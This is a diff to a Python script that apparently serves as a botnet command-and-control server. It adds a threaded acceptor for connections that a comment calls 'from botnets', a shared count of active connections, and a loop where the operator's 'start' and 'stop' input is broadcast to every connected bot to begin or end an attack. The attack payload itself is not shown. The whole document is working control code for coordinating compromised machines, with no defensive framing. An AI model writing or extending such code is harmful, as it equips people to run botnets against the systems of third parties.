@@ -1,50 +1,65 @@
 import socket
 import threading
 from threading import Event
-import time
+from time import sleep
+active_connections_lock = threading.Lock()
+active_connections = 0
 
-# A function to print a given message in a fancy way
-def print_waitmsg(wait_msg, stop_event: Event):
-    wait_msgs = [
-        f"{wait_msg}   ",
-        f"{wait_msg}.   ",
-        f"{wait_msg}..   ",
-        f"{wait_msg}...   "
-    ]
+def acceptor(s: socket.socket, run_attack: Event, stop_event: Event):
+    global active_connections
     while not stop_event.is_set():
-        for msg in wait_msgs:
-            print(msg, end='\r', flush=True)
-            time.sleep(0.3)
+        try:
+            connection, address = s.accept()
+            print("Got connection from ", address)
+            with active_connections_lock:
+                active_connections += 1
+            print("currently handling", active_connections, "connections")
+            client_thread = threading.Thread(target=handle_client, args=(connection, address, run_attack, stop_event))
+            client_thread.start()
+        except socket.timeout:  
+            # use periodic time outs to check if the user has pressed ctrl+c, 
+            # because accept() is a blocking call and it keeps ctrl+c in the queue until it a connection finally comes in
+            continue
 
 
 # function to handle a client connection if any
-def handle_client(conn: socket.socket, addr, stop_event: Event):
-
-   
-    print("Got connection from ", addr)
+def handle_client(conn: socket.socket, addr, run_attack: Event, stop_event: Event):
+    global active_connections
     conn.settimeout(1)
-
+    state = None
     
     while not stop_event.is_set():
         try:
-            command = input("> ")
-            print("command is ", command.encode())
-            conn.send(command.encode())
-        except socket.timeout:  
-            # use periodic time outs to check if the user has pressed ctrl+c, 
-            # because recv() is a blocking call and it keeps ctrl+c in the queue until it a connection finally comes in
-            continue
+            conn.recv(1024)
+        except socket.timeout:
+            pass
         except :
             print("")
-            print("Client must have disconnected.")
+            print("Client must have disconnected:", addr)
             break
+        if run_attack.is_set() and state != "attacking":
+            state = "attacking"
+            command = "start"
+            print("command is ", command.encode())
+            conn.send(command.encode())
+        elif (not run_attack.is_set()) and state == "attacking":
+            state = "stopped"
+            command = "stop"
+            print("command is ", command.encode())
+            conn.send(command.encode())
 
+    conn.close()
+    # Decrement the active connection count
+    with active_connections_lock:
+        active_connections -= 1
+        print(active_connections, "connections left")
 
 
 if __name__ == "__main__":
     
     # event that can be used to tell all threads to stop running
     stop_event = threading.Event() 
+    run_attack = threading.Event()
 
     # socket creation and initialization
     s = socket.socket()
@@ -57,27 +72,29 @@ if __name__ == "__main__":
 
     # listen for any incoming connections from clients
     s.listen(5)
+    # start a thread that accepts incoming connections from botnets
+    acceptor_thread = threading.Thread(target=acceptor, args=(s, run_attack, stop_event))
+    acceptor_thread.start()
 
     try:
-
-        # start a thread to do the fancy printing of the message "Socket is listening...,"
-        # waitmsg_thread = threading.Thread(target=print_waitmsg, args=("Socket is listening", stop_event))
-        # waitmsg_thread.start()
-
         # as long as the socket is running and the stop event is not set, keep accepting client connections
         while s and not stop_event.is_set():
-            try:
-                connection, address = s.accept()
-                # for every client that connects, start a thread to handle it
-                client_thread = threading.Thread(target=handle_client, args=(connection, address, stop_event))
-                client_thread.start()
-            except socket.timeout:  
-                # use periodic time outs to check if the user has pressed ctrl+c, 
-                # because accept() is a blocking call and it keeps ctrl+c in the queue until it a connection finally comes in
-                continue
+            # with active_connections_lock:
+                if active_connections > 0:
+                    sleep(1)
+                    command = input("> ")
+                    if command == "start":
+                        run_attack.set()
+                    elif command == "stop":
+                        run_attack.clear()
+                else:
+                    print("Waiting for connection...", end='\r', flush=True)
+            
+            
     except KeyboardInterrupt:
         # clean everything up once the user presses ctrl+c
         stop_event.set()
+        acceptor_thread.join()
         print("")
         print("Closing socket...")
         s.close()
